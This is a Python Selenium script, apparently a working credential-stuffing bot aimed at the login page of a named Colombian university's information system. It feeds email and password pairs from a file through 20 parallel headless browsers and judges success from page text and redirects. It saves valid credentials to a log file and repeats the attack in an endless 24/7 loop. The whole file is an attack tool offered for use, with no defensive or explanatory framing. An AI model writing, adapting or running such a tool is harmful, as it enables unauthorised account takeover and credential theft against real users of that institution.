import os
import time
import csv
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
log = logging.getLogger(__name__)

LOGIN_URL       = "https://siginv.uniguajira.edu.co/#/login"
ARCHIVO_CORREOS = "correos.txt"
WORKERS         = 20
ESPERA_CICLO    = 0


def get_driver():
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=800,600")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-sync")
    options.add_argument("--disable-translate")
    options.add_argument("--disable-plugins")
    options.add_argument("--no-first-run")
    options.add_argument("--disable-logging")
    options.add_argument("--log-level=3")
    options.add_argument("--blink-settings=imagesEnabled=false")
    service = Service("/usr/local/bin/chromedriver")
    return webdriver.Chrome(service=service, options=options)


def leer_correos(archivo):
    cuentas = []
    try:
        with open(archivo, "r", encoding="utf-8") as f:
            for linea in f:
                linea = linea.strip()
                if not linea or linea.startswith("#"):
                    continue
                partes = linea.split(",", 1)
                if len(partes) == 2:
                    cuentas.append((partes[0].strip(), partes[1].strip()))
    except FileNotFoundError:
        log.error(f"No se encontró: {archivo}")
    return cuentas


def probar_login(email, password):
    resultado = {"email": email, "password": password, "exitoso": False, "mensaje": ""}
    driver = None
    try:
        driver = get_driver()
        driver.get(LOGIN_URL)
        wait = WebDriverWait(driver, 15)

        wait.until(EC.presence_of_element_located((By.TAG_NAME, "input")))

        campo_email = wait.until(EC.presence_of_element_located((
            By.XPATH,
            "//input[contains(@placeholder,'orreo') or @type='email' "
            "or contains(@formcontrolname,'email') "
            "or contains(@formcontrolname,'correo') "
            "or contains(@formcontrolname,'usuario')]"
        )))
        campo_email.send_keys(email)

        campo_pass = driver.find_element(
            By.XPATH,
            "//input[@type='password' or contains(@placeholder,'ontraseña') "
            "or contains(@formcontrolname,'password')]"
        )
        campo_pass.send_keys(password)

        boton = driver.find_element(
            By.XPATH,
            "//button[@type='submit' or contains(.,'Ingresar') or contains(.,'Login')]"
        )
        boton.click()

        time.sleep(1.5)

        url_actual = driver.current_url
        pagina     = driver.page_source.lower()

        errores = ["contraseña incorrecta", "credenciales", "invalid",
                   "incorrecto", "no válido", "acceso denegado"]

        if any(e in pagina for e in errores):
            resultado["mensaje"] = "FALLIDO"
        elif "#/login" not in url_actual:
            resultado["exitoso"] = True
            resultado["mensaje"] = f"EXITOSO — {url_actual}"
        else:
            resultado["mensaje"] = "INCIERTO"

    except TimeoutException:
        resultado["mensaje"] = "TIMEOUT"
    except WebDriverException as e:
        resultado["mensaje"] = f"ERROR — {str(e)[:60]}"
    except Exception as e:
        resultado["mensaje"] = f"ERROR — {str(e)[:60]}"
    finally:
        if driver:
            driver.quit()

    return resultado


def guardar_resultados(resultados):
    os.makedirs("logs", exist_ok=True)

    archivo_log = "logs/resultados.csv"
    es_nuevo = not os.path.exists(archivo_log)
    with open(archivo_log, "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        if es_nuevo:
            writer.writerow(["timestamp", "email", "exitoso", "mensaje"])
        for r in resultados:
            writer.writerow([
                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                r["email"],
                "SÍ" if r["exitoso"] else "NO",
                r["mensaje"]
            ])

    exitosos = [r for r in resultados if r["exitoso"]]
    if exitosos:
        with open("logs/exitosos.txt", "a", encoding="utf-8") as f:
            for r in exitosos:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {r['email']} | {r['password']}\n")
        log.info(f"💾 {len(exitosos)} exitosos en logs/exitosos.txt")


def ejecutar_ciclo():
    cuentas = leer_correos(ARCHIVO_CORREOS)
    if not cuentas:
        log.error("correos.txt vacío")
        return

    total    = len(cuentas)
    exitosos = fallidos = 0
    resultados_ciclo = []

    log.info(f"📋 {total} cuentas | 🔀 {WORKERS} workers")
    inicio = time.time()

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = {executor.submit(probar_login, e, p): e for e, p in cuentas}
        completados = 0
        for future in as_completed(futures):
            r = future.result()
            resultados_ciclo.append(r)
            completados += 1
            if r["exitoso"]:
                exitosos += 1
                log.info(f"  [{completados}/{total}] ✅ {r['email']} — {r['mensaje']}")
            else:
                fallidos += 1
                log.warning(f"  [{completados}/{total}] ❌ {r['email']} — {r['mensaje']}")

    guardar_resultados(resultados_ciclo)

    duracion = round(time.time() - inicio, 1)
    cpm      = round((total / duracion) * 60, 1) if duracion > 0 else 0

    log.info(f"{'='*50}")
    log.info(f"📊 ✅ {exitosos} | ❌ {fallidos} | ⚡ {cpm} CPM | ⏱ {duracion}s")
    log.info(f"{'='*50}")


if __name__ == "__main__":
    log.info("🤖 Bot PARALELO — SIGINV Uniguajira — 24/7")
    ciclo = 1
    while True:
        log.info(f"🔄 CICLO #{ciclo} — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        ejecutar_ciclo()
        if ESPERA_CICLO > 0:
            time.sleep(ESPERA_CICLO)
        ciclo += 1
